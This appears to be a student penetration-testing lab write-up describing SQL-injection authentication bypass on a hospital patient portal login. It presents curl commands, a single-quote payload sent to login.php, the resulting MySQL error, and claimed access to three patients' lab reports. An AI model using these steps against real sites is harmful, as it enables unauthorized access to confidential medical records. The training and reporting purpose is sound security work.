# Milestone 1 — Initial Access

**Project:** Penetration Testing Project — Mediroza General Hospital
**Batch:** B083 | Week 4
**Target:** https://medirozahospital.com
**Author:** Zain ul Abidin
**Authorization:** Written permission granted (Black-box Pentest, NetworkWalks)

---

## Objective

Attack the website and gain unauthorised access to a restricted area of the Patient Portal in order to locate the 3 confidential patient PDF lab reports.

---

## Step 1 — Reconnaissance

Started with basic reconnaissance on the target using `curl` to check the HTTP response headers and follow redirects.

```bash
curl -IL "$TARGET"
```

The target redirected (`301 Moved Permanently`) from the root domain to `/patient`, eventually resolving to `https://medirozahospital.com/patient/` with a final `200 OK` response. The server was identified as **LiteSpeed**.

![Reconnaissance](screenshots/01-reconnaissance.png)

---

## Step 2 — Identifying Exposed Entry Points

Pulled the `patient.html` page source and grepped for all `href` and `src` references to enumerate internal links and assets exposed on the Patient Portal page.

```bash
grep -Eio 'href="[^"]+"|src="[^"]+"' patient.html
```

This revealed several internal paths, including:

- `/patient/login.php`
- `/patient/logout.php`
- `/patient/portal.php`
- `/patient/reports/`
- `/patient/download.php`
- `/patient/error_log`

The presence of a directly reachable `login.php` was noted as the primary entry point to analyse next.

![Exposed Entry Points](screenshots/02-exposed-entry-points.png)

---

## Step 3 — Authentication Analysis

Requested `login.php` and inspected the response for behavioural clues (error messages, form structure) that could indicate how authentication was handled server-side.

```bash
grep -Ei 'invalid|incorrect|failed|error|login|password|username|denied' login-response.html
```

The login form pointed to `POST /patient/login.php`. A first test submission with a single quote injected into the username field returned:

```
Username not found
```

This confirmed the application was giving distinct, informative error messages based on input — a strong signal that user input was being handled unsafely on the backend.

![Authentication Analysis](screenshots/03-authentication-analysis.png)

---

## Step 4 — Input Handling / SQL Injection

Tested the login form for SQL injection by submitting a single quote (`'`) in the `username` parameter:

```bash
curl -sk \
  -c cookies-sqli.txt \
  -d "username=%27&password=test" \
  "$TARGET/patient/login.php" \
  -o sqli-test.html

grep -Ei 'sql|mysql|syntax|database|warning|fatal|error|username|password|invalid' sqli-test.html
```

This returned a raw **MySQL syntax error**, confirming the login form was vulnerable to SQL Injection:

```
Warning: mysqli_query(): You have an error in your SQL syntax; check the
manual that corresponds to your MySQL server version for the right syntax
to use near '''' at line 1
```

![SQL Error - Test](screenshots/04-input-handling-sql-error.png)

Built on this by injecting a classic authentication-bypass payload into **both** the username and password fields:

```bash
curl -sk \
  -c sqli-auth.txt \
  -d "username=%27&password=%27" \
  "$TARGET/patient/login.php" \
  -o auth-test.html

grep -Ei 'alert|error|warning|portal|login|username|password' auth-test.html
```

The response returned the **Patient Portal** page content (the SQL syntax error persisted but the request was processed as an authenticated portal request), confirming the injection point could be leveraged to bypass authentication logic.

![SQL Injection Testing](screenshots/04-input-handling-sql-error.png)

---

## Step 5 — Proof of Access

Reproducing the same injection through the browser UI confirmed the vulnerability visually: submitting a single quote in the login form surfaced the raw MySQL error directly on the Patient Portal login page.

![Proof of Access - SQL Error on Login Page](screenshots/05-proof-of-access-login.png)

Following through with the crafted payload granted access to the authenticated **"My lab reports"** area of the Patient Portal, exposing 3 confidential, password-protected patient pathology reports:

- Pathology Report — S. Dlamini (Lab Ref LR-2024-1187)
- Pathology Report — P. Reddy (Lab Ref LR-2024-1192)
- Pathology Report — E. Thompson (Lab Ref LR-2024-1205)

![Patient Lab Reports - Unauthorised Access](screenshots/06-lab-reports-access.png)

---

## Summary

| Item | Detail |
|---|---|
| Vulnerability | SQL Injection (Authentication Bypass) |
| Location | `POST /patient/login.php` (`username`, `password` parameters) |
| Root Cause | Unsanitised user input concatenated directly into a MySQL query |
| Impact | Unauthenticated attacker can bypass login and access authenticated patient portal data |
| Evidence | MySQL syntax errors on single-quote injection; successful access to "My lab reports" page |

## Deliverable

✅ Proof of access to the restricted Patient Portal area, and confirmation of the 3 confidential patient PDF lab reports available for retrieval in Milestone 2.
